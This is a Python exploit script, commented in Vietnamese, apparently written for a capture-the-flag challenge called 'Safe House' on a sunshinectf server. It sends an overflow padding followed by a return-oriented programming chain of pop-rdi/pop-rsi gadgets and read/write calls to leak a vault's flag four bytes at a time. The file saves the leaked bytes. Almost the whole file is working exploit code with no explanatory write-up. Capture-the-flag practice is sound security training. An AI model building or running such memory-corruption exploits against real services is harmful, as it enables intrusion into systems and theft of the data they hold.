"""Safe House — rút cờ theo từng khối 4 byte.

Vault trả lời bằng HAI lần write (header 4 byte, rồi payload) trên SOCK_STREAM,
mà read() của unix socket chỉ lấy từ skb đầu tiên -> mỗi lần read chỉ ra 4 byte.
Nên: vòng 1 gửi request op=3 (idx=-4) rồi dump 2 khối; các vòng sau chỉ dump tiếp
cho tới khi hết payload, và giải mã offline (key = chính header rỗng).
"""
import socket
import struct
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import exploit as E  # noqa: E402

# exploit.py lấy host/port từ argv của chính nó; argv ở đây là của drain.py
E.HOST = "chal.sunshinectf.games"
E.PORT = 26007

NUM = E.NOTE_TABLE + 0x40      # chứa "200" (không dùng tới ở đây)
FOURSTR = E.FOUR               # byte '4' -> nested SUBMIT cho rdx = 4


def chain(send_request):
    p = b"A" * 0x48
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", FOURSTR)
    p += struct.pack("<Q", E.SUBMIT)                        # rdx = 4
    if send_request:
        p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
        p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.NOTE_TABLE)
        p += struct.pack("<Q", E.VAULT_SEND)
    for _ in range(1):
        p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
        p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
        p += struct.pack("<Q", E.READ_PLT)
        p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 1)
        p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
        p += struct.pack("<Q", E.WRITE_PLT)
    p += struct.pack("<Q", E.LOOP)
    assert len(p) <= E.SIZE, len(p)
    return p.ljust(E.SIZE, b"J") + b"\x90" * 4


def submit(s, send_request):
    s.sendall(b"SUBMIT %d\n" % E.SIZE)
    E.drain(s, 0.3)
    s.sendall(chain(send_request))
    return E.drain(s, 2.5)


def main():
    idx = int(sys.argv[1]) if len(sys.argv) > 1 else -4
    s = socket.create_connection((E.HOST, E.PORT), timeout=20)
    E.drain(s, 1.0)
    s.sendall(b"NOTE 0 " + struct.pack("<i", idx) + b"P\n")
    E.drain(s, 0.5)
    got = b""
    for i in range(16):
        out = submit(s, i == 0)
        j = out.rfind(b"OK\n")
        frag = out[j + 3:] if j >= 0 else b""
        frag = frag.replace(b"sh> ", b"")
        got += frag
        print("vòng %-2d -> %s" % (i, frag.hex()))
        if not frag.strip():
            break
    s.close()
    open("analysis/idx%d.bin" % idx, "wb").write(got)
    print("\ntổng %d byte: %s" % (len(got), got.hex()))


if __name__ == "__main__":
    main()
